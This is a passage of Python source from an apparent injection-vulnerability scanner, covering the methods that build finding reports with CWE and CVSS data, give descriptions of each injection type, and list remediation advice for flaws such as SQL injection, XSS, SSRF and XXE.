                return InjectionRisk.MEDIUM
            else:
                return InjectionRisk.LOW

    def _create_finding(
        self,
        vuln: InjectionVulnerability,
        context: Dict
    ) -> Dict[str, Any]:
        """Create a finding dictionary from vulnerability"""
        cwe_info = INJECTION_CWE_MAPPINGS.get(
            vuln.injection_type,
            INJECTION_CWE_MAPPINGS[InjectionType.SQL_INJECTION]
        )

        # Adjust CVSS based on confidence
        cvss_base = cwe_info['cvss_base']
        if vuln.confidence < 0.5:
            cvss_base = cvss_base * 0.7

        # Build evidence
        evidence_parts = [
            f"Parameter: {vuln.injection_point.parameter_name} ({vuln.injection_point.location})",
            f"Payload: {vuln.test_result.payload[:100]}...",
            f"Response code: {vuln.test_result.response_code}",
            f"Indicators: {', '.join(vuln.test_result.indicators_found[:5])}"
        ]

        if vuln.test_result.response_snippet:
            evidence_parts.append(f"Response snippet: {vuln.test_result.response_snippet[:200]}...")

        # Create fingerprint
        fingerprint_data = f"{vuln.endpoint}:{vuln.method}:{vuln.injection_point.parameter_name}:{vuln.injection_type.value}"
        fingerprint = hashlib.sha256(fingerprint_data.encode()).hexdigest()[:16]

        # Severity mapping
        severity_map = {
            InjectionRisk.CRITICAL: 'critical',
            InjectionRisk.HIGH: 'high',
            InjectionRisk.MEDIUM: 'medium',
            InjectionRisk.LOW: 'low',
            InjectionRisk.INFO: 'info'
        }

        # Get recommendations
        recommendations = self._get_recommendations(vuln.injection_type)

        return {
            'issue': self._get_issue_title(vuln.injection_type),
            'description': self._get_issue_description(vuln.injection_type, vuln),
            'severity': severity_map[vuln.risk_level],
            'category': 'Injection',
            'endpoint': vuln.endpoint,
            'method': vuln.method,
            'evidence': '\n'.join(evidence_parts),
            'cwe_id': cwe_info['id'],
            'cwe_name': cwe_info['name'],
            'cvss_score': round(cvss_base, 1),
            'recommendation': '\n'.join([f"• {r}" for r in recommendations]),
            'injection_type': vuln.injection_type.value,
            'parameter_name': vuln.injection_point.parameter_name,
            'parameter_location': vuln.injection_point.location,
            'payload_used': vuln.test_result.payload[:100],
            'confidence': round(vuln.confidence * 100, 1),
            'fingerprint': fingerprint,
            'discovered_at': datetime.now().isoformat()
        }

    def _get_issue_title(self, inj_type: InjectionType) -> str:
        """Get human-readable title for injection type"""
        titles = {
            InjectionType.SQL_INJECTION: 'SQL Injection Vulnerability',
            InjectionType.NOSQL_INJECTION: 'NoSQL Injection Vulnerability',
            InjectionType.XSS_REFLECTED: 'Reflected Cross-Site Scripting (XSS)',
            InjectionType.XSS_STORED: 'Stored Cross-Site Scripting (XSS)',
            InjectionType.XSS_DOM: 'DOM-based Cross-Site Scripting (XSS)',
            InjectionType.COMMAND_INJECTION: 'OS Command Injection',
            InjectionType.LDAP_INJECTION: 'LDAP Injection Vulnerability',
            InjectionType.XPATH_INJECTION: 'XPath Injection Vulnerability',
            InjectionType.SSTI: 'Server-Side Template Injection',
            InjectionType.SSRF: 'Server-Side Request Forgery (SSRF)',
            InjectionType.LFI: 'Local File Inclusion (LFI)',
            InjectionType.RFI: 'Remote File Inclusion (RFI)',
            InjectionType.XXE: 'XML External Entity (XXE) Injection',
            InjectionType.HEADER_INJECTION: 'HTTP Header Injection',
            InjectionType.CRLF_INJECTION: 'CRLF Injection',
            InjectionType.LOG_INJECTION: 'Log Injection',
            InjectionType.JSON_INJECTION: 'JSON Injection'
        }
        return titles.get(inj_type, 'Injection Vulnerability')

    def _get_issue_description(self, inj_type: InjectionType, vuln: InjectionVulnerability) -> str:
        """Get detailed description for the injection type"""
        descriptions = {
            InjectionType.SQL_INJECTION: f"A SQL injection vulnerability was detected in the '{vuln.injection_point.parameter_name}' parameter. This vulnerability allows attackers to execute arbitrary SQL commands, potentially leading to data theft, data modification, or complete database compromise.",
            InjectionType.NOSQL_INJECTION: f"A NoSQL injection vulnerability was detected in the '{vuln.injection_point.parameter_name}' parameter. Attackers can manipulate database queries to bypass authentication or access unauthorized data.",
            InjectionType.XSS_REFLECTED: f"A reflected XSS vulnerability was detected in the '{vuln.injection_point.parameter_name}' parameter. Malicious scripts injected through this parameter are reflected back to users, enabling session hijacking or credential theft.",
            InjectionType.COMMAND_INJECTION: f"An OS command injection vulnerability was detected in the '{vuln.injection_point.parameter_name}' parameter. Attackers can execute arbitrary system commands, potentially gaining complete control of the server.",
            InjectionType.SSTI: f"A server-side template injection vulnerability was detected in the '{vuln.injection_point.parameter_name}' parameter. Attackers can inject template directives to execute arbitrary code on the server.",
            InjectionType.LFI: f"A local file inclusion vulnerability was detected in the '{vuln.injection_point.parameter_name}' parameter. Attackers can read sensitive files from the server, including configuration files and source code.",
            InjectionType.SSRF: f"A server-side request forgery vulnerability was detected in the '{vuln.injection_point.parameter_name}' parameter. Attackers can make the server send requests to internal resources or cloud metadata services.",
            InjectionType.XXE: f"An XML external entity injection vulnerability was detected. Attackers can read local files, perform SSRF attacks, or cause denial of service through XML parsing.",
        }
        return descriptions.get(inj_type, f"An injection vulnerability was detected in the '{vuln.injection_point.parameter_name}' parameter.")

    def _get_recommendations(self, inj_type: InjectionType) -> List[str]:
        """Get recommendations for fixing the vulnerability"""
        recommendations = {
            InjectionType.SQL_INJECTION: [
                "Use parameterized queries (prepared statements) for all database operations",
                "Implement an ORM (Object-Relational Mapping) framework",
                "Apply input validation using allowlists",
                "Use stored procedures with parameterized inputs",
                "Implement least privilege for database accounts"
            ],
            InjectionType.NOSQL_INJECTION: [
                "Use parameterized queries for NoSQL databases",
                "Implement strict input validation",
                "Avoid using $where with user input in MongoDB",
                "Use schema validation to enforce data types",
                "Sanitize special NoSQL characters"
            ],
            InjectionType.XSS_REFLECTED: [
                "Implement context-aware output encoding",
                "Use Content-Security-Policy headers",
                "Sanitize user input before reflection",
                "Use HTTPOnly and Secure flags for cookies",
                "Implement X-XSS-Protection header"
            ],
            InjectionType.COMMAND_INJECTION: [
                "Avoid using system commands with user input",
                "Use language-specific APIs instead of shell commands",
                "Implement strict input validation with allowlists",
                "Use parameterized command execution",
                "Run processes with minimal privileges"
            ],
            InjectionType.SSTI: [
                "Avoid passing user input directly to template engines",
                "Use logic-less templates where possible",
                "Implement strict input validation",
                "Configure template sandboxing",
                "Use auto-escaping in templates"
            ],
            InjectionType.LFI: [
                "Validate file paths against an allowlist",
                "Use a whitelist of allowed files",
                "Implement proper access controls",
                "Avoid passing user input to file operations",
                "Use chroot or containerization"
            ],
            InjectionType.SSRF: [
                "Implement URL validation with allowlists",
                "Block requests to private IP ranges",
                "Disable unnecessary URL schemes",
                "Use network segmentation",
                "Implement IMDSv2 for cloud environments"
            ],
            InjectionType.XXE: [
                "Disable external entity processing in XML parsers",
                "Use JSON instead of XML where possible",
                "Validate and sanitize XML input",
                "Implement XML schema validation",
                "Use defusedxml library for Python"
            ]
        }
        return recommendations.get(inj_type, recommendations[InjectionType.SQL_INJECTION])

    def _create_no_vuln_finding(
        self,
        target: str,
        endpoint_count: int,
        context: Dict
    ) -> Dict[str, Any]:
        """Create a finding when no vulnerabilities are detected"""
        fingerprint = hashlib.sha256(f"injection_scan_complete:{target}".encode()).hexdigest()[:16]

        types_tested = ', '.join([t.value for t in InjectionType][:5]) + '...'

        return {
            'issue': 'Injection Vulnerability Assessment Complete',
            'description': f"Injection vulnerability assessment completed for {endpoint_count} endpoint(s). No injection vulnerabilities were detected during this scan. Types tested: {types_tested}",
            'severity': 'info',
            'category': 'Injection',
            'endpoint': target,
            'method': 'GET',
            'evidence': f"Tested {len(self.tested_points)} injection points across {endpoint_count} endpoints using {sum(len(p) for p in INJECTION_PAYLOADS.values())} payloads.",
            'cwe_id': 'N/A',
            'cwe_name': 'No Vulnerabilities Detected',
            'cvss_score': 0.0,
            'recommendation': '• Continue regular security assessments\n• Implement input validation as defense in depth\n• Use automated security testing in CI/CD\n• Conduct periodic penetration testing',
            'injection_type': 'assessment_complete',
            'injection_points_tested': len(self.tested_points),
            'endpoints_tested': endpoint_count,
            'fingerprint': fingerprint,
            'discovered_at': datetime.now().isoformat()
        }

    def get_fuzzing_summary(self) -> Dict[str, Any]:
        """Generate a summary of fuzzing activity"""
        return {
            'injection_points_tested': len(self.tested_points),
            'payload_types_available': list(INJECTION_PAYLOADS.keys()),
            'total_payloads_available': sum(len(p) for p in INJECTION_PAYLOADS.values()),
            'injection_types_supported': [t.value for t in InjectionType]
        }
